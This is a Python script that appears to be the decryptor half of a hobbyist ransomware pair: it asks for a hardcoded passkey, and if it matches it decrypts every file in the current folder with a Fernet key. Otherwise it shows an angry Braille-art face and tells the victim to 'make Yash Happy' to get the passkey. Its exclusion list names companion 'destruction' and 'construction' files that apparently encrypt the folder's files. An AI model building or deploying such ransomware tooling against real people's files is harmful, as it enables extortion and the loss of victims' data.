import os
from cryptography.fernet import Fernet

# Store the key securely and separately from the encrypted files
KEY_FILE = "Key.key"
angry = """
⠂⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⡖⠚⢿⣛⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣹⣎⢆⠻⣷⡻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣟⠿⣿⣿⣏⢧⢻⣷⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠺⣥⣽⣬⢦⠛⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠤⠖⠚⠛⠋⠉⣝⠉⠉⢩⡙⠛⠒⠦⠤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠖⠋⣉⠀⠀⠀⠀⠀⠀⠀⠋⠳⠺⠉⠀⠀⠀⠀⠀⠀⠉⠉⠲⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡭⠆⣠⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢮⣷⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠇⣠⡜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠋⠀⣰⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡌⢷⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⡿⠁⠀⠁⢸⣿⣿⣶⣶⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣦⣴⣶⣶⣿⣿⠁⠀⢳⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠀⡠⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣄⡀⠀⢄⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠀⣠⢣⡇⠀⠘⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠃⠀⠀⣜⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠃⣾⠇⢠⡄⠀⣠⠏⠀⠀⠉⡝⣿⣿⡿⢿⣿⣿⠇⣿⣿⣿⣿⣿⡿⠿⡛⠋⠁⢹⡄⠀⠀⢰⠀⠀⢿⠟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⡆⠀⡏⠀⢸⠀⠀⢻⡀⠀⠀⠀⢻⣻⣿⣿⠆⢈⠉⠀⠉⢫⢡⡸⠿⢿⣿⠃⠀⠀⠈⡇⠀⠀⢸⡄⠀⠈⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⠃⢰⠀⠀⡇⠀⠸⣆⠀⠀⠳⣄⠀⠀⠀⠈⠉⢁⣠⢞⣀⡴⣦⡸⡆⠙⠓⠛⠉⠀⠀⠀⣰⠇⠀⠀⢸⡇⡆⠀⢹⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠰⣿⠀⣾⠀⠀⣿⠀⠀⠈⠣⣄⣀⠀⠙⠓⠒⠒⠛⢉⡴⠋⠀⣠⠀⠙⢞⠧⣤⣀⣀⣀⣤⠴⠃⠀⠀⢀⡿⠀⣇⠀⠀⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⠀⡏⠀⠀⠇⠀⠀⠀⠀⠀⠀⠉⠉⠀⢀⡠⠖⠁⠀⠀⠀⣻⠀⠀⠈⢣⡀⠀⠠⣄⣀⣀⣀⣠⠴⠋⠀⠀⢻⡀⠀⢻⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⡏⢠⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣯⣅⣀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠹⣦⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⣇⠀⠸⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⠁⢸⣾⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣍⠛⠲⣤⣀⡀⠃⣀⣠⣤⡄⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡎⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠢⣄⡀⠉⠉⣀⡤⠴⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣽⠀⠀⠀
⠀⠀⠀⠀⠀⢸⠇⠀⢸⠀⢠⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢩⠉⠉⠀⠀⠀⠀⠀⠀⠀⠳⢄⡀⠀⠀⠀⠀⠀⠀⠀⠘⡏⠀⠀⠀
⠀⠀⠀⠀⠀⡞⠀⣀⡀⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣆⠀⠀⠀⠀⠀⠀⡆⡇⠀⠀⠀
⠀⠀⠀⠀⢸⠇⠸⠛⠋⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠀⠀⠀⠀⠀⣀⠀⠀⠘⠀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢆⠀⠀⠀⠀⡟⢧⠀⠀⠀
⠀⠀⠀⢠⡏⠀⡀⠀⠀⢀⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠒⠀⠀⠈⠓⠦⠤⠤⠤⠀⠙⠛⠛⠋⠀⠀⠛⠦⠄⠀⠀⠀⠙⣆⠀⢠⠁⢸⡆⠀⠀
⠀⠀⠀⡞⠀⢸⢧⡀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠤⣀⡀⠀⠀⠀⠀⠀⠙⢠⣼⠀⠀⢳⠀⠀
⠀⠀⣼⠇⠀⠀⠀⠀⠀⠸⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠦⣤⣀⣀⠀⠀⠀⠙⠲⠶⠦⠶⠂⠀⠀⠉⢀⠀⠀⠀⠀⢀⠏⡿⠀⠀⢸⡇⠀
⠀⢠⡏⠀⠀⠀⠀⠀⠀⠀⢺⡆⠀⠀⠀⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣀⡀⠀⠀⠀⠀⠙⠓⠀⠀⡿⢀⠇⠀⠀⠀⡇⠀
⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠀⠀⠀⠀⠻⢤⣄⣀⣠⡤⠀⠀⠀⠀⠉⠀⠀⠀⠀⠂⠀⠀⠁⣼⠀⠟⠛⠀⢳⠀
⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣄⠀⠀⠀⠀⡀⠀⠀⠀⠀⣀⠀⠀⠀⢀⡀⠀⠀⠀⣀⠀⠀⠀⠀⠐⠶⠤⠀⠀⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⣼⠀
⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⣄⠀⠀⠀⢳⡀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⠀⠀⠀⣠⢿⡇
⠀⠸⡇⠀⠀⠀⠀⠀⠀⡀⠀⠈⣧⠙⣆⠀⠀⠀⠻⡀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠀⠀⢹⡟⡆⠀⡼⠁⢸⠇
⠀⠀⠻⡾⡆⡀⠀⠀⠀⡟⢦⣠⠇⠀⠘⢧⡀⠀⠀⠉⠉⣧⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡄⠀⣼⣠⣿⠞⠁⣰⠏⠀
⠀⠀⠀⠳⣷⡱⡆⠀⠀⢷⡀⠀⠀⢆⣰⢀⠙⣄⠀⠀⠀⠀⠉⠳⠶⢦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠾⠋⠀⢸⠻⠭⠤⠔⠊⠁⠀⠀
⠀⠀⠀⠀⠈⠓⠻⣦⣤⣤⡟⠀⠀⠸⠛⢺⡀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠉⠉⠒⠒⠉⠀⠀⠀⠀⠀⠀⠀⣠⡴⠋⠁⠀⠀⢀⣼⢐⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⡀⠀⠃⠀⠀⠀⠀⠀⠙⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠖⠛⠁⠀⢠⣀⣤⣄⣺⣿⠸⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡀⠀⠀⣦⣀⡀⠀⠀⠀⠈⠙⠲⠶⠶⠶⠶⠶⠶⠛⠛⢩⡉⡀⠀⠀⠀⠀⠈⠛⠃⠀⣴⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⣄⠀⠉⠁⠀⠀⠀⠀⢀⡼⠂⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⣷⢦⣤⣀⠀⣀⣀⣰⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠦⣴⠶⠶⢲⡚⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣠⡴⠉⠈⢻⣁⣉⣋⣀⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠤⢖⣖⡦⠼⠴⢤⣀⣷⣲⣤⡀⠀⠀⠀⠀⠀⢠⠞⢁⢤⡙⡟⣇⠀⢶⠟⡾⣷⣆⡈⢉⢳⣇⣬⠛⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠥⢽⡑⣠⢔⣒⡀⢀⡇⠀⢩⠉⢹⡇⠀⠀⠀⠀⠈⠛⠾⠟⠛⠛⠛⠷⠦⠤⣼⣃⣋⣼⣁⣀⡿⠭⠶⠿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠒⠒⠛⠙⠶⠤⠿⠟⠑⠶⠿⠽⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀

"""


happy = """"

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠞⠛⠉⢙⡛⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠋⠀⠀⠀⢰⠁⠀⠀⠉⢻⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠇⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠜⢹⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⡶⠶⠮⠭⠵⢖⠒⠿⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠲⣄⡀⠀⠀⠀⠀⠀⣰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠚⠿⡷⣄⣀⣴⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠪⣻⣄⠀⠀⠀⣀⣀⠤⠴⠒⠚⢋⣭⣟⣯⣍⠉⠓⠒⠦⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣼⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⡝⣧⠔⠋⠁⠀⣀⠤⠔⣶⣿⡿⠿⠿⠿⠍⠉⠒⠢⢤⣀⠈⠑⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡦⠤⢤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣞⣧⠤⠒⠉⠀⠀⠾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢲⣴⣾⣷⢤⡀⠀⠀⠀⠀⠀⠀⠀
⢰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠀⠀⠀⠀⠈⠙⠳⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠟⢿⣿⣧⠙⢦⠀⠀⠀⠀⠀⠀
⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣦⣄⡀⠀⠐⢄⠀⠀⠀⢻⡇⠀⠀⠀⠀⡠⢊⣭⣬⣭⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⡀⠀⠑⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⡀⠀⠑⢄⣀⢿⠇⠀⠀⠀⡜⣼⠟⠁⠀⠀⠉⢿⡄⠀⠀⠀⠀⣠⠤⠤⠤⣀⡀⠈⠙⡄⠀⠈⢆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣝⢦⡀⠀⣠⡞⠢⢄⠀⡜⣼⠁⣠⣴⣶⢦⡀⠀⢻⠀⠀⢀⣎⡴⠟⠛⠛⠶⣝⢦⠀⠘⡄⠀⠈⢧⠀⠀
⢢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⢻⡾⠋⠀⣀⣀⠁⠁⡇⢰⢿⣄⣿⣎⢷⠀⢸⡇⠀⢸⡝⢀⣤⣄⡀⠀⠙⢷⡀⠀⢱⠀⠀⠈⡇⠀
⠸⡆⠀⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⠈⠙⣳⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⣧⠀⢀⣀⣀⡉⠱⣿⣼⣆⢿⠻⣯⡞⠀⢸⡇⠀⢸⣷⣏⢙⣿⡻⡆⠀⠀⢳⠀⠀⠀⠀⠀⢸⡀
⠀⢳⡀⠀⠀⠀⠀⠀⠉⠚⠁⠀⠀⠀⠀⠀⠉⠻⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡏⠈⠁⠀⠀⠉⠢⠈⠛⢻⣿⠿⠛⠁⢀⣿⠇⠀⠈⣿⣿⢿⡟⣧⡷⠀⠀⢸⡄⠀⠀⠀⠀⠈⡇
⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⢧⡀⠀⠀⠀⠢⠤⠔⡽⠁⠚⠉⠉⠉⢗⢷⣄⡠⣀⢻⣆⣀⣠⡿⠋⠀⠀⠀⠈⢿⡷⠿⠟⠁⠀⠀⣼⠀⠀⠀⠀⠀⠀⢱
⠀⠀⠀⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠻⡄⠀⢀⣀⡤⠞⠁⠀⠀⠀⠀⠀⠘⢦⡈⠁⠀⠀⠸⡟⠉⠀⠀⠀⠀⠀⠀⠀⠙⢦⣀⣤⡶⠟⠉⠙⠒⠀⠀⠀⠀⢘
⠀⠀⠀⠀⠈⠳⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡀⠀⡇⣿⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣤⡀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠍⠠⠤⠒⠂⢄⠀⠀⠀⠀⠀⢸
⠀⠀⠀⠀⠀⠀⠈⠙⠲⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢀⣽⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡉⠓⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣉⡿⠓⠲⠄⠀⠀⠀⠀⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠶⢤⣤⣄⣀⣠⣤⡤⠶⠛⣿⡀⠀⢢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣄⠀⠀⠉⠙⠒⠲⠤⠤⠤⣤⣤⡤⠖⠚⠁⠀⠀⠀⠀⠀⠀⠀⢰⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣦⣄⡀⠀⠀⠀⢀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⡀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢫⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡱⡀⠀⠀⠣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⣔⢹⡉⢻⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣆⠀⠀⠈⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣥⣠⣹⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣕⢄⠀⠀⠈⠂⠀⠀⠀⠀⠀⠀⠀⠈⠓⠢⠌⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢷⡦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠔⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠺⢕⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠴⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠤⢄⣀⣀⣀⣀⣀⣀⣠⠤⠴⠒⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

"""


passkey = input("Enter Your PassKey: ")

if passkey == "1234":
    # Load the key from the key file
    with open(KEY_FILE, "rb") as key_file:
        key = key_file.read()

    files_to_decrypt = [file for file in os.listdir() if os.path.isfile(
        file) and file != "destruction.py" and file != "Key.key" and file != "construction.py" and file != "construction.exe" and file != "destruction.exe"]

    for file in files_to_decrypt:
        if file != "construction.exe":
            with open(file, "rb") as encrypted_file:
                encrypted_contents = encrypted_file.read()

            # Decrypt the contents using the key
            fernet = Fernet(key)
            decrypted_contents = fernet.decrypt(encrypted_contents)

            with open(file, "wb") as decrypted_file:
                decrypted_file.write(decrypted_contents)

    print(happy)
    print("You have made Yash Happy ;) !")
    print("Your Files have been decrypted !! ")
    input("Press Enter to exit...")

else:
    print(angry)
    print("Please Make Yash Happy to Access The PassKey")
    input("Press Enter to exit...")
